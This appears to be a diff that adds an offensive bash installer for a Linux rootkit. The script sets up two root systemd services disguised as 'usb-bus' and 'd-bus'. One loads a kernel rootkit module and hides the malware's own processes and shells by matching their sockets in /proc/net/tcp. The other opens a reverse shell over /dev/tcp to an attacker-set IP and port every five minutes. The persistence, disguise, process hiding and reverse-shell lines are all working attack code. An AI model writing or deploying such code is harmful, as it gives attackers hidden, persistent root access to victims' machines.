@@ -1,0 +1,99 @@
+#!/bin/bash
+
+#--1st systemd service--
+#that's the script that is gonna insert the usb-bus rootkit module at boot, hide the systemd services and the bash processes
+hiding_script=$(cat << \EOF
+#!/bin/bash
+
+insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko
+
+hidden_pids=()
+
+while true; do
+
+#hide usb-bus and d-bus, which are the scripts that the systemd services execute
+bash_pid=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
+while read hide_pid; do
+  cmdline=$(cat /proc/$hide_pid/cmdline)
+  cat /proc/$hide_pid/cmdline &>/dev/null
+  if [ "$?" == "1" ]; then
+    continue
+  fi
+  if [ "$cmdline" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmdline" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
+    kill -31 $hide_pid
+    #echo "hid systemd service pid: $hide_pid"
+  fi
+done <<<$bash_pid
+
+#hide bash shells which our systemd service spawns
+inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0150A8C0:270F/) print $10 }')
+for (( i=1; i <= 65553; i=i+1 )); do
+  if [ "${hidden_pids[i]}" != "" ]; then
+    #echo "$i already on hidden_pids"
+    continue
+  fi
+  socket=$(readlink /proc/$i/fd/0)
+  while read inode_number; do
+    if [ "socket:[$inode_number]" == "$socket" ]; then
+      #echo "pid: $i inode_number: $inode_number"
+      kill -31 $i
+      #echo "hid bash pid: $i"
+      hidden_pids[i]=$i
+      #echo "hidden_pids[i] pid: ${hidden_pids[i]}"
+    fi
+  done <<<$inode_list
+done
+
+#sleep 10
+
+done
+EOF
+)
+
+#that's the systemd service that's gonna do the hiding
+hiding_service=$(cat << \EOF
+[Unit]
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+ExecStart=/var/lib/usb-bus/usb-bus
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+)
+
+#--2nd systemd service--
+#that's the script that's gonna open the bash connections
+bash_script=$(cat << EOF
+#!/bin/bash
+
+while true; do
+
+bash &>/dev/tcp/$ip/$port 0>&1 &
+sleep 300
+
+done
+EOF
+)
+
+#that's the systemd service that's gonna open the bash connections
+bash_service=$(cat << \EOF
+[Unit]
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+ExecStart=/usr/local/share/d-bus/d-bus
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+)
